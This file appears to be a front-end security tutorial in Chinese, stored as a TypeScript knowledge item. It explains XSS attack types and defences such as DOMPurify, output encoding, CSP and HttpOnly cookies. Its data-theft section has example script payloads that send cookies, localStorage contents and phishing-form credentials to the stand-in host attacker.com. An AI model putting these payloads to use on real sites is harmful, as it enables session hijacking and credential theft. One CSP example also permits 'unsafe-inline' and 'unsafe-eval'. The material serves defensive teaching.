import { KnowledgeItem } from '@/types/knowledge';

export const xss_prevention: KnowledgeItem = {
      id: 'xss-prevention',
      title: 'XSS 攻击与防护',
      category: 'security',
      difficulty: 'medium',
      tags: ['前端安全', 'XSS', '跨站脚本攻击', '防护策略'],
      content: `## XSS 攻击与防护

XSS (Cross-Site Scripting) 是一种常见的前端安全漏洞，攻击者通过注入恶意脚本到网页中，当用户浏览该页面时，恶意脚本会在用户的浏览器中执行。

### 🛡️ XSS 攻击类型

**存储型 XSS：**
- **恶意脚本被存储在服务器数据库中**
- **当其他用户访问包含该脚本的页面时触发**
- **常见于论坛、评论系统、社交网络**
- **危害较大，影响范围广**

**反射型 XSS：**
- **恶意脚本通过 URL 参数传递**
- **服务器将参数反射回浏览器执行**
- **常见于搜索、错误页面**
- **通常需要用户点击恶意链接**

**DOM 型 XSS：**
- **恶意脚本在客户端执行**
- **不经过服务器**
- **利用 DOM 操作漏洞**
- **直接在浏览器中执行**

### 💻 代码示例：XSS 攻击演示

\`\`\`javascript
// 存储型 XSS
// 恶意评论
const maliciousComment = '<script>alert("XSS")</script>';
// 存储到数据库
saveComment(maliciousComment);

// 其他用户访问时
function displayComments() {
  comments.forEach(comment => {
    // 不安全的渲染
    document.getElementById('comments').innerHTML = comment;
  });
}

// 反射型 XSS
// 恶意 URL
const maliciousURL = 'https://example.com/search?q=<script>alert("XSS")</script>';
// 服务器反射
function search(q) {
  return \`Search results for: \${q}\`;
}

// DOM 型 XSS
// 不安全的 DOM 操作
function updateContent() {
  const userInput = getUserInput();
  document.getElementById('content').innerHTML = userInput;
}

// 恶意输入
const maliciousInput = '<img src=x onerror="alert(\'XSS\')">';
updateContent(maliciousInput);
\`\`\`

### XSS 攻击危害

**数据窃取：**
- 窃取用户 cookie
- 窃取会话令牌
- 窃取用户敏感信息
- 钓鱼攻击

**会话劫持：**
- 冒充用户身份
- 执行未授权操作
- 访问用户账户
- 修改用户数据

**网站破坏：**
- 篡改网页内容
- 重定向到恶意网站
- 植入恶意广告
- 影响网站声誉

**拒绝服务：**
- 消耗浏览器资源
- 导致页面崩溃
- 影响用户体验
- 可能影响服务器

### 代码示例

#### 数据窃取示例

\`\`\`javascript
// 窃取 Cookie
const maliciousScript = \`
  <script>
    // 窃取所有 cookie
    const cookies = document.cookie;
    
    // 发送到攻击者服务器
    fetch('https://attacker.com/steal', {
      method: 'POST',
      body: JSON.stringify({ cookies }),
      headers: { 'Content-Type': 'application/json' }
    });
  </script>
\`;

// 窃取本地存储
const stealLocalStorage = \`
  <script>
    const localStorageData = {};
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      localStorageData[key] = localStorage.getItem(key);
    }
    
    fetch('https://attacker.com/steal', {
      method: 'POST',
      body: JSON.stringify({ localStorageData }),
      headers: { 'Content-Type': 'application/json' }
    });
  </script>
\`;

// 钓鱼攻击
const phishingScript = \`
  <script>
    // 创建虚假登录表单
    const fakeForm = document.createElement('form');
    fakeForm.method = 'POST';
    fakeForm.action = 'https://attacker.com/steal-credentials';
    
    const usernameInput = document.createElement('input');
    usernameInput.name = 'username';
    usernameInput.placeholder = 'Username';
    
    const passwordInput = document.createElement('input');
    passwordInput.name = 'password';
    passwordInput.type = 'password';
    passwordInput.placeholder = 'Password';
    
    const submitButton = document.createElement('button');
    submitButton.type = 'submit';
    submitButton.textContent = 'Login';
    
    fakeForm.appendChild(usernameInput);
    fakeForm.appendChild(passwordInput);
    fakeForm.appendChild(submitButton);
    
    document.body.appendChild(fakeForm);
  </script>
\`;
\`\`\`

### XSS 防护策略

**输入验证：**
- 对用户输入进行过滤
- 限制输入长度
- 验证输入格式
- 转义特殊字符

**输出编码：**
- HTML 实体编码：HTML实体编码是将特殊字符转换为HTML实体表示的方法，如小于号<转换为&lt;、大于号>转换为&gt;、引号"转换为&quot;等，可以防止用户输入被解析为HTML代码，是防御XSS攻击的最基本方法，在将用户输入插入到HTML页面中时必须进行HTML实体编码，大多数现代前端框架默认会自动进行HTML编码
- JavaScript 编码：当用户输入需要插入到JavaScript代码中时，需要进行JavaScript编码，将特殊字符转换为Unicode转义序列，如单引号\'转换为\\u0027、双引号\"转换为\\u0022等，JavaScript编码可以防止用户输入突破字符串边界被执行，是防止XSS攻击的重要组成部分，在动态生成JavaScript代码时必须使用
- CSS 编码：当用户输入需要插入到CSS属性值中时，需要进行CSS编码，将特殊字符转换为CSS转义序列，如反斜杠\\转换为\\\\、换行转换为\\A等，CSS编码可以防止用户输入突破CSS属性值边界注入新的CSS规则或JavaScript，是防止XSS和CSS注入攻击的重要手段
- URL 编码：URL编码（Percent-encoding）是将特殊字符转换为URL安全格式的方法，将字符转换为%XX格式的十六进制表示，如空格转换为%20、中文转换为UTF-8编码的%XX格式等，URL编码用于将用户输入安全地插入到URL的查询参数或路径中，防止URL注入和参数污染攻击

**内容安全策略 (CSP)：**
- 限制脚本执行来源
- 禁止内联脚本
- 禁止 eval() 等危险函数
- 配置 report-uri 监控攻击

**HTTP Only Cookie：**
- 防止 JavaScript 访问 cookie
- 减少 cookie 被窃取的风险
- 提高会话安全性

**现代框架防护：**
- React：自动转义内容：React框架默认会对JSX中的内容进行HTML转义，防止XSS攻击，当使用{userInput}插入用户输入时，React会自动将特殊字符转换为HTML实体，只有使用dangerouslySetInnerHTML时需要手动处理转义，这是React的安全特性之一，但开发者仍需注意不要使用用户输入来构建动态组件名或属性名
- Vue：v-html 指令的安全使用：Vue的v-html指令用于渲染HTML内容，但存在XSS风险，因为v-html不会对HTML内容进行转义，如果HTML内容包含恶意脚本，可能会被执行，使用v-html时应该确保内容来源可信，或者使用DOMPurify等库对HTML进行净化，避免直接渲染用户输入的HTML内容
- Angular：内置 XSS 防护：Angular框架内置了强大的XSS防护机制，默认对所有数据绑定进行转义处理，Angular的编译器会对模板进行严格的安全检查，阻止危险的绑定方式，Angular还提供了DomSanitizer服务用于安全地处理需要插入原始HTML的场景，使用bypassSecurityTrustHtml等方法时必须确保内容已经过适当清理
- 使用框架提供的安全 API

### 代码示例

#### 输入验证示例

\`\`\`javascript
// 使用 DOMPurify 清理 HTML
import DOMPurify from 'dompurify';

function sanitizeHTML(html) {
  return DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['p', 'br', 'strong', 'em'],
    ALLOWED_ATTR: []
  });
}

// 使用示例
const userInput = '<script>alert("XSS")</script><p>Hello</p>';
const cleanHTML = sanitizeHTML(userInput);
console.log(cleanHTML); // '<p>Hello</p>'

// 验证输入格式
function validateInput(input, type) {
  const patterns = {
    email: /^[^\s@]+@[^\s@]+\.[^\s@]+$/,
    url: /^https?:\/\/.+/,
    username: /^[a-zA-Z0-9_]{3,20}$/
  };
  
  return patterns[type].test(input);
}

// 限制输入长度
function truncateInput(input, maxLength) {
  return input.length > maxLength ? input.substring(0, maxLength) : input;
}

// 使用示例
const email = 'user@example.com';
if (validateInput(email, 'email')) {
  console.log('Valid email');
} else {
  console.log('Invalid email');
}
\`\`\`

#### 输出编码示例

\`\`\`javascript
// HTML 实体编码
function encodeHTML(str) {
  return str.replace(/[&<>"']/g, function(m) {
    return {
      '&': '&amp;',
      '<': '&lt;',
      '>': '&gt;',
      '"': '&quot;',
      "'": '&#39;'
    }[m];
  });
}

// JavaScript 编码
function encodeJS(str) {
  return str.replace(/[\\u0000-\\uFFFF]/g, function(m) {
    return '\\\\u' + ('0000' + m.charCodeAt(0).toString(16)).slice(-4);
  });
}

// URL 编码
function encodeURL(str) {
  return encodeURIComponent(str);
}

// 使用示例
const userInput = '<script>alert("XSS")</script>';
const safeHTML = encodeHTML(userInput);
console.log(safeHTML); // '&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;'

// React 自动转义
function ReactComponent({ content }) {
  // React 自动转义 content
  return <div>{content}</div>;
}

// 使用 dangerouslySetInnerHTML（不推荐）
function UnsafeComponent({ content }) {
  // 不安全，需要手动转义
  return <div dangerouslySetInnerHTML={{ __html: content }} />;
}

// 安全使用 dangerouslySetInnerHTML
function SafeComponent({ content }) {
  const cleanHTML = DOMPurify.sanitize(content);
  return <div dangerouslySetInnerHTML={{ __html: cleanHTML }} />;
}
\`\`\`

#### CSP 配置示例

\`\`\`html
<!-- HTTP 头配置 -->
<meta http-equiv="Content-Security-Policy" content="
  default-src 'self';
  script-src 'self' 'unsafe-inline' 'unsafe-eval' https://trusted.cdn.com;
  style-src 'self' 'unsafe-inline' https://trusted.cdn.com;
  img-src 'self' data: https:;
  connect-src 'self' https://api.example.com;
  font-src 'self' https://trusted.cdn.com;
  object-src 'none';
  base-uri 'self';
  form-action 'self';
  frame-ancestors 'none';
  report-uri /csp-report
">

<!-- 服务器配置示例 -->
<!-- Nginx -->
add_header Content-Security-Policy "
  default-src 'self';
  script-src 'self' https://trusted.cdn.com;
  style-src 'self' https://trusted.cdn.com;
  img-src 'self' data: https:;
  connect-src 'self' https://api.example.com;
  font-src 'self' https://trusted.cdn.com;
  object-src 'none';
  base-uri 'self';
  form-action 'self';
  frame-ancestors 'none';
  report-uri /csp-report
";

<!-- Express.js -->
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'", "https://trusted.cdn.com"],
    styleSrc: ["'self'", "https://trusted.cdn.com"],
    imgSrc: ["'self'", "data:", "https:"],
    connectSrc: ["'self'", "https://api.example.com"],
    fontSrc: ["'self'", "https://trusted.cdn.com"],
    objectSrc: ["'none'"],
    baseUri: ["'self'"],
    formAction: ["'self'"],
    frameAncestors: ["'none'"],
    reportUri: "/csp-report"
  }
}));
\`\`\`

#### HTTP Only Cookie 示例

\`\`\`javascript
// 设置 HTTP Only Cookie
res.cookie('sessionId', sessionId, {
  httpOnly: true,  // 防止 JavaScript 访问
  secure: true,    // 只通过 HTTPS 传输
  sameSite: 'strict',  // 防止 CSRF 攻击
  maxAge: 3600000,  // 1 小时过期
  path: '/'
});

// Express.js 示例
app.use(session({
  secret: 'your-secret-key',
  cookie: {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict',
    maxAge: 3600000
  }
}));

// Next.js 示例
export async function setSessionCookie(res, sessionId) {
  res.setHeader('Set-Cookie', [
    \`sessionId=\${sessionId}; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=3600\`
  ]);
}
\`\`\`

### 防护最佳实践

- 始终对用户输入进行验证和清理
- 使用框架提供的安全 API，避免手动拼接 HTML
- 配置严格的 CSP 策略
- 使用 HTTP Only 和 Secure Cookie
- 定期进行安全审计和渗透测试
- 保持依赖库的更新
- 使用安全的第三方库
- 实施内容安全策略监控
- 教育开发团队安全意识

`,
      createdAt: '2026-03-14',
      updatedAt: '2026-03-14'
    };
